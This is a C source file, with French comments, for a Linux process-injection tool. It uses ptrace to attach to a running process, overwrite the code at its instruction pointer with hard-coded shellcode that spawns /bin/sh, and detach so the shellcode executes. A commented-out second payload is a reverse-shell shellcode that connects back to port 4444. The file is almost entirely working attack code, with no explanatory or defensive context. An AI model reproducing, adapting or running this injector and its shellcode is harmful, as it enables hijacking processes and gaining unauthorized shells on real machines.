#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/reg.h>
#include <sys/user.h>

#define SHELLCODE_SIZE 32
unsigned char *shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
// unsigned char *reverse_shell = "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
// "\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6"
// "\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
// "\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
// "\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
// "\x89\xe6\x0f\x05";

int inject_data(pid_t pid, unsigned char* src, void* dst, int len)
{
    int i;
    uint64_t* s = (uint64_t*)src;
    uint64_t* d = (uint64_t*)dst;

    for (i = 0; i < len; i += 8, s++, d++) {
        if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0) {
            perror("ptrace(POKETEXT):");
            return -1;
        }
    }
    return 0;
}

int main(int argc, char* argv[])
{
    pid_t target;
    struct user_regs_struct regs;
    int syscall;

    pid_t uid = getuid();
    printf("Uid : %d\n", uid);
    if (argc != 2) {
        fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
        exit(1);
    }
    target = atoi(argv[1]);
    printf("+ Suivi du processus %d\n", target);

    if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
        perror("ptrace(ATTACH):");
        exit(1);
    }

    printf("+ En attente du processus...\n");
    wait(NULL);

    printf("+ Récupération des registres\n");
    if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0) {
        perror("ptrace(GETREGS):");
        exit(1);
    }

    /* Injection de code à la position actuelle du RIP */
    /* Le registre RIP contient l'adresse  de l'instruction en cours */
    printf("+ Injection du shellcode à %p\n", (void*)regs.rip);
    inject_data(target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);


    regs.rip += 2; // PTRACE_DETACH soustrait 2 octets du pointeur d'instruction
    printf("+ Définition du pointeur d'instruction à %p\n", (void*)regs.rip);

    if ((ptrace(PTRACE_SETREGS, target, NULL, &regs)) < 0) {
        perror("ptrace(GETREGS):");
        exit(1);
    }
    printf("+ Exécution !\n");

    // le shellcode sera exécuté (puisque c'est pointé par RIP) après le détachement
    if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0) {
        perror("ptrace(DETACH):");
        exit(1);
    }
    return 0;
}
